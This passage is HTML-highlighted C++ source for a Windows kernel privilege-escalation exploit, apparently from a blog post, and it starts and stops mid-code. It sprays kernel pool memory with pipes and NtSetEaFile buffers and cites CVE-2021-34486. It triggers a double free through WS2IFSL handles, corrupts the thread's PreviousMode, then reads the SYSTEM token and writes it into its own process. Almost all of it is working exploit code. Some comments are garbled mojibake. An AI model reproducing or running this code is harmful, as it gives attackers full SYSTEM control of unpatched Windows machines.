class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ws2P Process</span></span><br><span class="line">HANDLE* g_ProcessList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateProcessFileHandle</span><span class="params">(HANDLE hThreadApc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING deviceName;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;deviceName, (PWSTR)<span class="string">L&quot;\\Device\\WS2IFSL\\NifsPvd&quot;</span>);</span><br><span class="line"></span><br><span class="line">	OBJECT_ATTRIBUTES object;</span><br><span class="line">	<span class="built_in">InitializeObjectAttributes</span>(&amp;object, &amp;deviceName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PFILE_FULL_EA_INFORMATION pFileEa =</span><br><span class="line">		(PFILE_FULL_EA_INFORMATION)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pFileEa == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error malloc\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pFileEa-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;EaNameLength = <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	pFileEa-&gt;EaValueLength = <span class="built_in">sizeof</span>(PROC_DATA);</span><br><span class="line">	<span class="built_in">memcpy</span>(pFileEa-&gt;EaName, <span class="string">&quot;NifsPvd&quot;</span>, pFileEa-&gt;EaNameLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	PPROC_DATA pProcData = (PPROC_DATA)((<span class="type">char</span>*)pFileEa + <span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">4</span>);</span><br><span class="line">	pProcData-&gt;ApcThread = hThreadApc;</span><br><span class="line">	pProcData-&gt;RequestQueueRoutine = (PVOID)<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">	pProcData-&gt;CancelQueueRoutine = (PVOID)<span class="number">0xbbbbbbbb</span>;</span><br><span class="line">	pProcData-&gt;ApcContext = (PVOID)<span class="number">0xcccccccc</span>;</span><br><span class="line">	pProcData-&gt;unknown3 = (PVOID)<span class="number">0xdddddddd</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE handle = INVALID_HANDLE_VALUE;</span><br><span class="line">	IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// object -&gt; handle</span></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtCreateFile</span>(</span><br><span class="line">		&amp;handle, </span><br><span class="line">		MAXIMUM_ALLOWED, </span><br><span class="line">		&amp;object, </span><br><span class="line">		&amp;IoStatusBlock, </span><br><span class="line">		<span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, </span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		pFileEa,</span><br><span class="line">		<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA)</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NT_ERROR</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtCreateFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileEa);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pFileEa);</span><br><span class="line">	<span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io Pool</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">APCThread</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">0x100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NpFr</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PIPE_HANDLES</span> &#123;</span><br><span class="line">	HANDLE r;</span><br><span class="line">	HANDLE w;</span><br><span class="line">&#125; PIPE_HANDLES;</span><br><span class="line"></span><br><span class="line">std::vector&lt;PIPE_HANDLES&gt; g_Pipe;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SprayPipe</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr begin...\r\n&quot;</span>);</span><br><span class="line">	ULONG payloadSize = size - <span class="number">0x40</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayPipe; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		PIPE_HANDLES pipe;</span><br><span class="line">		UCHAR* payload = (UCHAR*)<span class="built_in">malloc</span>(payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;malloc failed, err: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(payload, <span class="string">&#x27;p&#x27;</span>, payloadSize);</span><br><span class="line">		BOOL res = <span class="built_in">CreatePipe</span>(&amp;pipe.r, &amp;pipe.w, <span class="literal">NULL</span>, payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreatePipe\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DWORD resultLength;</span><br><span class="line">		<span class="comment">// res = WriteFile(writePipe, payload, sizeof(payload), &amp;resultLength, NULL);</span></span><br><span class="line">		res = <span class="built_in">WriteFile</span>(pipe.w, payload, payloadSize, &amp;resultLength, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;Error WriteFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		g_Pipe.<span class="built_in">push_back</span>(pipe);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtSetEaFile)</span><span class="params">(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG)</span></span>;</span><br><span class="line">PNtSetEaFile NtSetEaFile;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">Setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_hDevice = <span class="built_in">CreateFileW</span>(DEVICE, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == g_hDevice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFileW DEVICE\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// wprintf(L&quot;Open device %s succeeded, handle: %p\n&quot;, DEVICE, ghDev);</span></span><br><span class="line"></span><br><span class="line">	g_ThreadApcHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, APCThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_ThreadApcHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_ProcessList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P);</span><br><span class="line">	<span class="keyword">if</span> (g_ProcessList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_ProcessList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(g_ProcessList, <span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P, <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">	NtSetEaFile = (PNtSetEaFile)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtSetEaFile&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (NtSetEaFile == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress(NtSetEaFile)\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io</span></span><br><span class="line"><span class="comment">// é€šè¿‡ payloadSize å¯ä»¥æ§åˆ¶chunkçš„å¤§å°</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hPEAuth;</span><br><span class="line">	UCHAR* payload;</span><br><span class="line">	ULONG PayloadSize;</span><br><span class="line">&#125; ParamSprayEaFile;</span><br><span class="line"></span><br><span class="line">HANDLE* g_EaThreadList;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadSprayEaFile</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ParamSprayEaFile* _param = (ParamSprayEaFile*)param;</span><br><span class="line">	IO_STATUS_BLOCK iostatus;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">NtSetEaFile</span>(_param-&gt;hPEAuth, &amp;iostatus, _param-&gt;payload, _param-&gt;PayloadSize);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EaFile =&gt; Io</span></span><br><span class="line"><span class="comment">// è¯¦æƒ…ï¼šCVE-2021-34486</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SprayEaFile</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// é¦–å…ˆå¾—è·å¾—æ ¸å¿ƒæ•°</span></span><br><span class="line">	<span class="comment">// SYSTEM_INFO SystemInfo;</span></span><br><span class="line">	<span class="comment">// GetSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// GetNativeSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;</span></span><br><span class="line">	CountConcurrentSprayEaFile = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io ...\r\n&quot;</span>);</span><br><span class="line">	ParamSprayEaFile* param = (ParamSprayEaFile*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ParamSprayEaFile));</span><br><span class="line">	<span class="keyword">if</span> (param == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc ParamSprayEaFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;PayloadSize = size - <span class="number">0x10</span>;</span><br><span class="line">	param-&gt;hPEAuth = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\PEAuth&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;hPEAuth == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFile PEAuth \r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;payload = (UCHAR*)<span class="built_in">malloc</span>(param-&gt;PayloadSize);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;payload == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc payload\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(param-&gt;payload, param-&gt;PayloadSize, <span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line">	*(ULONG32*)(&amp;param-&gt;payload[<span class="number">0x0</span>]) = <span class="number">0x636F7250</span>; <span class="comment">// Proc</span></span><br><span class="line">	<span class="comment">// FsContext-&gt;RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode</span></span><br><span class="line">	<span class="comment">// !!!!! Attation + 0x30</span></span><br><span class="line">	*(ULONG64*)(&amp;param-&gt;payload[<span class="number">0x38</span>]) = g_ExploitEthread + <span class="number">0x232</span> + <span class="number">0x30</span>; </span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line"></span><br><span class="line">	g_EaThreadList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountConcurrentSprayEaFile);</span><br><span class="line">	<span class="keyword">if</span> (g_EaThreadList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_EaThreadList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EaThreadList[i] = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ThreadSprayEaFile, param, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (g_EaThreadList[i] == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread ThreadSprayEaFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// ä¸ºæŒ‡å®šçº¿ç¨‹è®¾ç½®å¤„ç†å™¨å…³è”æ©ç </span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">SetThreadAffinityMask</span>(g_EaThreadList[i], <span class="number">1</span> &lt;&lt; i) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error SetThreadAffinityMask\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// é€’å‡çº¿ç¨‹çš„æŒ‚èµ·è®¡æ•°ã€‚ å½“æš‚åœè®¡æ•°å‡ä¸ºé›¶æ—¶ï¼Œå°†æ¢å¤çº¿ç¨‹çš„æ‰§è¡Œ</span></span><br><span class="line">		<span class="built_in">ResumeThread</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ç­‰å¾…ï¼Œç›´åˆ°ä¸€ä¸ªæˆ–æ‰€æœ‰æŒ‡å®šå¯¹è±¡å¤„äºä¿¡å·çŠ¶æ€æˆ–è¶…æ—¶é—´éš”å·²è¿‡ã€‚</span></span><br><span class="line">	<span class="built_in">WaitForMultipleObjects</span>(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(param-&gt;hPEAuth);</span><br><span class="line">	<span class="built_in">free</span>(param-&gt;payload);</span><br><span class="line">	<span class="built_in">free</span>(param);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io done\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Cleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] cleanup...\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">CloseHandle</span>(g_hDevice);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (g_Pipe.<span class="built_in">size</span>() != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (PIPE_HANDLES p : g_Pipe)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.r);</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.w);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *PNtReadVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_writes_bytes_(BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG BufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtWriteVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG NumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">atexit</span>(Cleanup);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Setup ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Setup</span>();</span><br><span class="line">	g_ThreadExploitHandle = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Hacking thread: %#llx\r\n&quot;</span>, (ULONG64)<span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] LeakByQuerySystemInfomation\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">LeakByQuerySystemInfomation</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Defragment \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">SprayPipe</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate target \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Allocate64</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Free first \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();                            </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Ws2P =&gt; Mdl \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		g_ProcessList[i] = <span class="built_in">CreateProcessFileHandle</span>(g_ThreadApcHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate Memory avoid crash \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayMm; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Double free \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();           </span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Eafile =&gt; Ws2P \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">SprayEaFile</span>(<span class="number">0x120</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// æ‰¾äº†ä¸€å¤©çš„ BUG</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Close Ws2P Process Handle \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_ProcessList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DWORD dwBytesWriten;</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Exploiting... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread: %#lx \r\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="comment">//WriteFile(sync.w, &quot;Y&quot;, 1, &amp;dwBytesWriten, NULL);</span></span><br><span class="line"></span><br><span class="line">	HANDLE hCur = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// éœ€è¦ç¡®ä¿ _KTHREAD.PreviousModeä¸º0</span></span><br><span class="line">	PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == NtWriteVirtualMemory)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L&quot;ntdll.dll&quot;), &quot;NtReadVirtualMemory&quot;);</span></span><br><span class="line">	<span class="comment">//if (NULL == NtWriteVirtualMemory)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	wprintf(L&quot;[-] Error GetProcAddress NtReadVirtualMemory\r\n&quot;);</span></span><br><span class="line">	<span class="comment">//	exit(1);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write EPROCESS token =&gt; SYSTEM</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Read System token ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">	ULONG BytesWritten = <span class="number">0</span>;</span><br><span class="line">	ULONG64 Token[] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// addr =&gt; buffer</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		&amp;Token,</span><br><span class="line">		(PVOID)(g_SystemEprocess + <span class="number">0x4b8</span> - <span class="number">0x10</span>), <span class="comment">//   +0x4b8 Token</span></span><br><span class="line">		<span class="built_in">sizeof</span>(Token),</span><br><span class="line">		&amp;BytesWritten);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Read System token: %#llx %#llx %#llx %#llx\n&quot;</span>, Token[<span class="number">0</span>], Token[<span class="number">1</span>], Token[<span class="number">2</span>], Token[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">if</span> (BytesWritten == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error read token, please reboot...\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// buffer =&gt; address</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_CurrentEprocess + <span class="number">0x4b8</span>),</span><br><span 